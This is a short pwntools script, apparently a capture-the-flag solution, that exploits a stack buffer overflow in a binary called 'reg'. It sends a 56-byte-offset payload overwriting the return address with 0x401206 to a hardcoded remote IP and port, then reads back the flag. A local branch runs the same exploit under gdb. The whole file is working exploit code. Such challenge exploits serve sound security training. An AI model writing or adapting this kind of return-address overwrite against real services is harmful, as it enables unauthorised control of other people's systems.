from pwn import *
import time

context.terminal = ['tmux', 'new-window']
target = './reg'
context.binary = target
binary = ELF(target)

rhost = "83.136.252.214" 
rport = 36577 

offset = 56

payload = flat(
        {offset: 0x401206}
)


if args['PWN']:
    r = remote(rhost, rport) 
    r.sendlineafter('Enter your name :', payload)
    r.recvuntil('Congratulations!\n')
    flag = r.recv()
    success(flag)
    r.close()
if args['GEF']:
    p = process(target,setuid=True)
    gdb.attach(p, gdbscript='continue')
    p.sendlineafter('Enter your name :', payload)
    time.sleep(10)
    p.recvuntil('Congratulations!\n')
    flag = p.recv()
    success(flag)
    p.close()

